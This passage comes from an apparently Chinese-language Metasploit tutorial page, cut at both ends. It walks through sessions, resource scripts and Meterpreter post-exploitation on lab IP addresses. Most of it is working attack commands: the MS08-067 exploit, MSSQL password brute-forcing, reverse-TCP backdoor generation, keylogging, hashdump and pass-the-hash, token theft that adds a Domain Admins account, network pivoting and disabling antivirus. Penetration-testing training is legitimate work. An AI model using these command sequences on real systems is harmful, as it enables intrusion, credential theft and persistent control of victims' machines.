查看建立的session  <code>sessions –l</code></p><p>激活session   <code>sessions –i  num</code>    #num为session编号</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2暴力端口探测">2、暴力端口探测：<a class="hash-link" href="#2暴力端口探测" title="标题的直接链接">​</a></h3><p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.122</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search ports   #搜索与ports相关模块</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j   #作为后台任务运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –l –v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sesssions –i 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf脚本文件">3、MSF脚本文件：<a class="hash-link" href="#3msf脚本文件" title="标题的直接链接">​</a></h3><p>为了缩短测试时间可以将msf命令写入一个文件，然后在msf中加载它。</p><p>加载方式：msfconsole的resource命令或者msfconsole加上-r选项</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘version’ &gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘load sounds’ &gt;&gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole –r resource.rc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo 'use exploit/windows/smb/ms08_067_netapi' &gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 'set RHOST 192.168.1.133' &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 'set PAYLOAD windows/meterpreter/reverse_tcp' &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 'set LHOST 192.168.1.111' &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 'exploit' &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource autoexp.rc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="六meterpreter">六．METERPRETER<a class="hash-link" href="#六meterpreter" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用meterpreter">1、使用meterpreter<a class="hash-link" href="#1使用meterpreter" title="标题的直接链接">​</a></h3><p>当对目标系统进行溢出时，使用meterpreter作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。
例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#假如已经探测到1433（TCP）和1434(UDP)端口（mssql），</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.1/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此可获取服务器名称，版本号等信息。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell功能添加账户：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/windows/mssql/mssql_payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 433</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD password130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>当获取到一个meterpreter shell 后可以执行更多的操作：</p><p>获取屏幕截图：<code>screenshot</code></p><p>获取系统信息：<code>sysinfo</code></p><p>获取键盘记录：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  #查看目标机器进程，假设发现explorer.exe的进程号为1668:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1668  #插入该进程</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/capture/keylog_recorder  #运行键盘记录模块，将击键记录保存到本地txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat /root/.msf3/loot/*****.txt  #查看结果</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取系统账号密码：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash登陆，需要使用pass-the-hash技术：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/psexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：</p><p>在目标机器上执行：<code>net uaer hacker pass /add</code></p><p>本地生成一个后门程序：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将payload.exe拷贝到目标机器然后使用新建立的账号执行,本地执行端口监听，等待来自目标机器连接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getuid</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此取得SYSTEM权限</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2令牌模拟">2、令牌模拟：<a class="hash-link" href="#2令牌模拟" title="标题的直接链接">​</a></h3><p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#有时ps命令列出的进程中可能不存在域控账户的进程，此时使用incognito模块查看可用token：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens –u  #列出可用token，假如找到域控token</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50  #将账户添加至域管理员组</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3内网渗透">3、内网渗透：<a class="hash-link" href="#3内网渗透" title="标题的直接链接">​</a></h3><p>当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run get_local_subnets  #查看网段/子网</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Local subnet: 192.168.33.0/255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; background  #转入后台运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route add 192.168.33.0 255.255.255.0 1  #本地添加路由信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route print #查看添加的信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use linux/samba/lsa_transnames_heap   #准备向内网目标主机进攻</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 10.10.1.129 #此处为attacking主机的外网IP </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.33.132 #内网目标主机</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>也可以使用自动式添加路由模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4meterpreter脚本">4、Meterpreter脚本：<a class="hash-link" href="#4meterpreter脚本" title="标题的直接链接">​</a></h3><p>使用run scriptname 方式执行</p><p>vnc脚本,获取远程机器vnc界面控制</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run vnc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run screen_unlock</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>进程迁移</p><p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/manage/migrate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（在64位win7中migrate需要管理员权限执行后门才能成功，而migrate前后获取的权限是有差异的。）</p><p>关闭杀毒软件</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取系统密码hash</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（64位win7下需要管理员权限执行后门且先getsystem，然后使用</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run  post/windows/gather/hashdump来dump hash成功率更高。</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>而且如果要使用shell添加系统账户的话win7下得先：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code 